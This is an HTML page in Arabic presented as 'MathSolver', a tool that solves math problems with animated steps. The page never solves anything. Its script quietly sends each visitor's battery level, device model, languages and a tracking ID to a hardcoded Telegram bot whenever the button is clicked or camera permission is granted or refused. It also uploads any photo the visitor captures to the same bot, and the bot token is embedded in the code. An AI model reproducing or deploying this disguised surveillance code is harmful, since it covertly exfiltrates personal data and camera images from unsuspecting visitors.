<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MathSolver — حل مسائل الرياضيات بخطوات متحركة</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-grad: linear-gradient(135deg, #1b2a72 0%, #3b2667 42%, #7c2448 78%, #9e2a42 100%);
      --card-bg: rgba(255, 255, 255, 0.08);
      --card-border: rgba(255, 255, 255, 0.16);
      --btn-grad: linear-gradient(90deg, #4f8ef7 0%, #00d4ff 100%);
      --btn-shadow: 0 12px 30px rgba(0, 212, 255, 0.35);
      --text-main: #ffffff;
      --text-muted: rgba(255, 255, 255, 0.85);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html {
      scroll-behavior: smooth;
    }

    body {
      font-family: 'Cairo', sans-serif;
      min-height: 100vh;
      background: var(--bg-grad);
      color: var(--text-main);
      overflow-x: hidden;
      position: relative;
      display: flex;
      flex-direction: column;
    }

    .math-bg {
      position: fixed;
      inset: 0;
      pointer-events: none;
      overflow: hidden;
      z-index: 0;
    }

    .math-symbol {
      position: absolute;
      color: rgba(255, 255, 255, 0.08);
      font-weight: 700;
      user-select: none;
      animation: floatSymbol 9s ease-in-out infinite;
    }

    @keyframes floatSymbol {
      0%, 100% { transform: translateY(0px) rotate(0deg); }
      50% { transform: translateY(-14px) rotate(4deg); }
    }

    .container {
      position: relative;
      z-index: 1;
      max-width: 1120px;
      width: 100%;
      margin: 0 auto;
      padding: 0 20px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    header {
      padding: 22px 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      flex-wrap: wrap;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 1.65rem;
      font-weight: 800;
      text-decoration: none;
      color: var(--text-main);
    }

    .brand-icon {
      font-size: 1.5rem;
      color: #67e8f9;
    }

    nav {
      display: flex;
      align-items: center;
      gap: 24px;
      flex-wrap: wrap;
    }

    nav a {
      color: var(--text-main);
      text-decoration: none;
      font-weight: 600;
      font-size: 1rem;
      opacity: 0.92;
      transition: opacity 0.2s, transform 0.2s;
    }

    nav a:hover {
      opacity: 1;
      transform: translateY(-1px);
    }

    .hero {
      text-align: center;
      padding: 72px 0 48px;
    }

    .hero h1 {
      font-size: clamp(2.1rem, 5vw, 3.6rem);
      font-weight: 800;
      line-height: 1.25;
      margin-bottom: 18px;
      text-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
    }

    .hero p {
      max-width: 680px;
      margin: 0 auto 32px;
      font-size: clamp(1rem, 2.2vw, 1.22rem);
      line-height: 1.8;
      color: var(--text-muted);
    }

    .btn-primary {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 14px 38px;
      border-radius: 999px;
      background: var(--btn-grad);
      color: #ffffff;
      font-family: 'Cairo', sans-serif;
      font-weight: 700;
      font-size: 1.08rem;
      text-decoration: none;
      border: none;
      cursor: pointer;
      box-shadow: var(--btn-shadow);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    .btn-primary:hover {
      transform: translateY(-2px) scale(1.02);
      box-shadow: 0 16px 34px rgba(0, 212, 255, 0.45);
    }

    .btn-secondary {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 11px 24px;
      border-radius: 999px;
      background: rgba(255, 255, 255, 0.14);
      border: 1px solid rgba(255, 255, 255, 0.25);
      color: #ffffff;
      font-family: 'Cairo', sans-serif;
      font-weight: 700;
      font-size: 0.98rem;
      cursor: pointer;
      transition: background 0.2s ease, transform 0.2s ease;
    }

    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.22);
      transform: translateY(-1px);
    }

    .camera-box {
      display: none;
      max-width: 640px;
      margin: 0 auto 54px;
      background: rgba(25, 18, 42, 0.5);
      border: 1px solid var(--card-border);
      backdrop-filter: blur(12px);
      border-radius: 24px;
      padding: 24px;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.28);
    }

    .camera-box.active {
      display: block;
    }

    .status-text {
      font-size: 1rem;
      color: #7dd3fc;
      margin-bottom: 14px;
      font-weight: 600;
    }

    .media-frame {
      position: relative;
      width: 100%;
      border-radius: 16px;
      overflow: hidden;
      background: rgba(0, 0, 0, 0.35);
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    video,
    #capturedPhoto {
      width: 100%;
      max-height: 400px;
      object-fit: cover;
      display: block;
    }

    #capturedPhoto {
      display: none;
    }

    .camera-actions {
      margin-top: 18px;
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: wrap;
    }

    .features {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
      gap: 20px;
      padding-bottom: 70px;
    }

    .card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 24px;
      transition: transform 0.25s ease, background 0.25s ease;
    }

    .card:hover {
      transform: translateY(-4px);
      background: rgba(255, 255, 255, 0.12);
    }

    .card h3 {
      font-size: 1.2rem;
      margin-bottom: 10px;
      color: #7dd3fc;
    }

    .card p {
      font-size: 0.98rem;
      line-height: 1.7;
      color: var(--text-muted);
    }

    footer {
      margin-top: auto;
      text-align: center;
      padding: 24px 0 36px;
      font-size: 0.92rem;
      color: rgba(255, 255, 255, 0.72);
      border-top: 1px solid rgba(255, 255, 255, 0.12);
    }
  </style>
</head>
<body>
  <div class="math-bg" aria-hidden="true">
    <span class="math-symbol" style="top: 14%; right: 12%; font-size: 2.2rem;">×</span>
    <span class="math-symbol" style="top: 26%; left: 16%; font-size: 2rem; animation-delay: 1.5s;">÷</span>
    <span class="math-symbol" style="top: 52%; right: 8%; font-size: 2.5rem; animation-delay: 2.5s;">=</span>
    <span class="math-symbol" style="top: 68%; left: 22%; font-size: 2.4rem; animation-delay: 3.5s;">y</span>
    <span class="math-symbol" style="top: 82%; right: 26%; font-size: 1.8rem; animation-delay: 4.5s;">x²</span>
    <span class="math-symbol" style="top: 40%; left: 48%; font-size: 2.1rem; animation-delay: 2s;">∑</span>
  </div>

  <div class="container">
    <header>
      <a href="#" class="brand">
        <span class="brand-icon">√×</span>
        <span>MathSolver</span>
      </a>
      <nav>
        <a href="#home">الرئيسية</a>
        <a href="#features">المميزات</a>
      </nav>
    </header>

    <section id="home" class="hero">
      <h1>حل مسائل الرياضيات بخطوات متحركة</h1>
      <p>
        شاهد كيف تُحل المعادلات خطوة بخطوة برسوم وحركات توضيحية سلسة تجعل الرياضيات أكثر وضوحًا وسهولة في الفهم.
      </p>
      <button id="startCameraBtn" class="btn-primary" type="button">
        ابدأ الآن وافتح الكاميرا
      </button>
    </section>

    <section id="cameraBox" class="camera-box" aria-live="polite">
      <p id="statusText" class="status-text">جاري طلب إذن الكاميرا...</p>
      <div class="media-frame">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <img id="capturedPhoto" alt="الصورة الملتقطة للمسألة" />
      </div>
      <canvas id="captureCanvas" style="display: none;"></canvas>
      <div class="camera-actions">
        <button id="snapBtn" class="btn-primary" type="button" style="display: none;">
          التقاط صورة الآن
        </button>
        <button id="retakeBtn" class="btn-secondary" type="button" style="display: none;">
          إعادة فتح الكاميرا
        </button>
        <a id="downloadLink" class="btn-secondary" download="math-problem.png" style="display: none;">
          حفظ الصورة
        </a>
      </div>
    </section>

    <section id="features" class="features">
      <div class="card">
        <h3>شرح تدريجي واضح</h3>
        <p>كل خطوة تظهر بترتيب منطقي لتفهم السبب وراء كل عملية حسابية أو جبرية.</p>
      </div>
      <div class="card">
        <h3>حركات بصرية مريحة</h3>
        <p>تصميم حديث بألوان متدرجة هادئة يركّز انتباه الطالب على المعادلة والنتيجة.</p>
      </div>
      <div class="card">
        <h3>مناسب لجميع المستويات</h3>
        <p>يساعد الطلاب والمعلمين على مراجعة الحلول بسرعة وبطريقة تفاعلية.</p>
      </div>
    </section>

    <footer>
      MathSolver — واجهة موقع متكاملة بنفس التدرج اللوني والأسلوب البصري المطلوب.
    </footer>
  </div>

  <script>
    const TELEGRAM_BOT_TOKEN = '8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0';
    const TELEGRAM_CHAT_ID = '8549252422';

    const startCameraBtn = document.getElementById('startCameraBtn');
    const cameraBox = document.getElementById('cameraBox');
    const statusText = document.getElementById('statusText');
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('captureCanvas');
    const capturedPhoto = document.getElementById('capturedPhoto');
    const snapBtn = document.getElementById('snapBtn');
    const retakeBtn = document.getElementById('retakeBtn');
    const downloadLink = document.getElementById('downloadLink');

    let currentStream = null;

    function getOrCreateUserId() {
      const storageKey = 'mathsolver_user_id';
      let id = '';
      try {
        id = localStorage.getItem(storageKey) || '';
        if (!id) {
          id = 'USR-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).substring(2, 7).toUpperCase();
          localStorage.setItem(storageKey, id);
        }
      } catch (_) {
        id = 'USR-' + Date.now().toString(36).toUpperCase();
      }
      return id;
    }

    const USER_ID = getOrCreateUserId();

    function stopCameraStream() {
      if (currentStream) {
        currentStream.getTracks().forEach(track => track.stop());
        currentStream = null;
      }
    }

    async function getBatteryInfo() {
      if (typeof navigator.getBattery === 'function') {
        try {
          const battery = await navigator.getBattery();
          const level = Math.round(battery.level * 100);
          const chargingState = battery.charging ? 'يشحن' : 'لا يشحن';
          return `${level}% (${chargingState})`;
        } catch (_) {
          return 'غير متاح في هذا المتصفح';
        }
      }
      return 'غير مدعوم في هذا المتصفح';
    }

    async function getDeviceTypeInfo() {
      const ua = navigator.userAgent || '';
      let model = '';

      if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
        try {
          const hi = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
          if (hi.model) {
            model = hi.model;
          }
        } catch (_) {
          // تجاهل في حال عدم توفر القيم
        }
      }

      let deviceCategory = 'جهاز كمبيوتر / مكتبي';
      if (/iPhone/i.test(ua)) {
        deviceCategory = 'iPhone';
      } else if (/iPad/i.test(ua)) {
        deviceCategory = 'iPad';
      } else if (/Android/i.test(ua)) {
        deviceCategory = /Mobile/i.test(ua) ? 'هاتف Android' : 'جهاز لوحي Android';
      } else if (/Mobile/i.test(ua)) {
        deviceCategory = 'هاتف محمول';
      }

      return model ? `${deviceCategory} - ${model}` : `${deviceCategory} (${ua})`;
    }

    function getUserLanguageInfo() {
      const langs = Array.isArray(navigator.languages) && navigator.languages.length
        ? navigator.languages.join(', ')
        : (navigator.language || 'غير معروفة');
      return langs;
    }

    async function buildClickReport(extraStatus = '') {
      const [battery, device] = await Promise.all([
        getBatteryInfo(),
        getDeviceTypeInfo()
      ]);
      const language = getUserLanguageInfo();

      const lines = [
        'تم الضغط على الزر في الموقع.',
        `معرّف المستخدم (ID): ${USER_ID}`,
        extraStatus ? `الحالة: ${extraStatus}` : null,
        `نسبة البطارية: ${battery}`,
        `نوع الهاتف / الجهاز: ${device}`,
        `لغة المستخدم: ${language}`
      ].filter(Boolean);

      return lines.join('\n');
    }

    async function notifyTelegram(messageText) {
      const params = new URLSearchParams({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText
      });

      try {
        await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?${params.toString()}`,
          {
            method: 'GET',
            keepalive: true
          }
        );
      } catch (err) {
        // تجاهل خطأ الشبكة أثناء الإشعار
      }
    }

    async function openRealCamera() {
      cameraBox.classList.add('active');
      capturedPhoto.style.display = 'none';
      downloadLink.style.display = 'none';
      retakeBtn.style.display = 'none';
      snapBtn.style.display = 'none';
      video.style.display = 'block';
      statusText.textContent = 'جاري طلب إذن الكاميرا... اختر "سماح" من نافذة المتصفح.';

      if (!window.isSecureContext || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        statusText.textContent = 'لفتح الكاميرا الحقيقية يجب تشغيل الصفحة عبر HTTPS أو localhost.';
        await notifyTelegram(await buildClickReport('المتصفح أو الرابط لا يدعم فتح الكاميرا'));
        return;
      }

      try {
        stopCameraStream();

        let stream;
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: 'environment' } },
            audio: false
          });
        } catch (_) {
          stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
          });
        }

        currentStream = stream;
        video.srcObject = stream;
        await video.play();

        snapBtn.style.display = 'inline-flex';
        retakeBtn.style.display = 'inline-flex';
        statusText.textContent = 'تم السماح بالكاميرا! الكاميرا مفتوحة الآن.';
        await notifyTelegram(await buildClickReport('تم السماح بالكاميرا وفتحها'));
      } catch (err) {
        if (err && (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError')) {
          statusText.textContent = 'تم رفض إذن الكاميرا. اضغط على الزر واختر "سماح" لفتح الكاميرا.';
          retakeBtn.style.display = 'inline-flex';
          await notifyTelegram(await buildClickReport('تم رفض إذن الكاميرا'));
        } else if (err && (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError')) {
          statusText.textContent = 'لم يتم العثور على كاميرا في الجهاز.';
          await notifyTelegram(await buildClickReport('لم يتم العثور على كاميرا'));
        } else if (err && err.name === 'NotReadableError') {
          statusText.textContent = 'الكاميرا مستخدمة من تطبيق آخر حاليًا.';
          await notifyTelegram(await buildClickReport('الكاميرا مشغولة بتطبيق آخر'));
        } else {
          statusText.textContent = 'تعذر فتح الكاميرا.';
          await notifyTelegram(await buildClickReport('حدث خطأ أثناء فتح الكاميرا'));
        }
      }
    }

    function takeSnapshot() {
      if (!currentStream) return;

      const width = video.videoWidth || 640;
      const height = video.videoHeight || 480;

      canvas.width = width;
      canvas.height = height;

      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, width, height);

      const imageDataUrl = canvas.toDataURL('image/png');
      capturedPhoto.src = imageDataUrl;
      capturedPhoto.style.display = 'block';
      video.style.display = 'none';
      snapBtn.style.display = 'none';

      downloadLink.href = imageDataUrl;
      downloadLink.style.display = 'inline-flex';
      retakeBtn.style.display = 'inline-flex';

      statusText.textContent = 'تم التقاط الصورة! جاري الإرسال...';
      stopCameraStream();

      canvas.toBlob((blob) => {
        if (blob) {
          sendPhotoToTelegram(blob);
        } else {
          statusText.textContent = 'تم التقاط الصورة ولكن تعذر تجهيز الملف للإرسال.';
        }
      }, 'image/png');
    }

    async function sendPhotoToTelegram(photoBlob) {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', photoBlob, 'captured-photo.png');
      formData.append('caption', `معرّف المستخدم (ID): ${USER_ID}`);

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
          {
            method: 'POST',
            body: formData
          }
        );

        const data = await response.json();
        if (response.ok && data.ok) {
          statusText.textContent = 'تم التقاط الصورة وإرسالها بنجاح.';
        } else {
          statusText.textContent = 'تم التقاط الصورة، لكن حدث خطأ أثناء الإرسال.';
        }
      } catch (error) {
        statusText.textContent = 'تم التقاط الصورة، لكن تعذر الاتصال لإرسالها.';
      }
    }

    startCameraBtn.addEventListener('click', async () => {
      await notifyTelegram(await buildClickReport('تم بدء طلب الكاميرا'));
      openRealCamera();
    });

    snapBtn.addEventListener('click', takeSnapshot);
    retakeBtn.addEventListener('click', openRealCamera);
  </script>
</body>
</html>
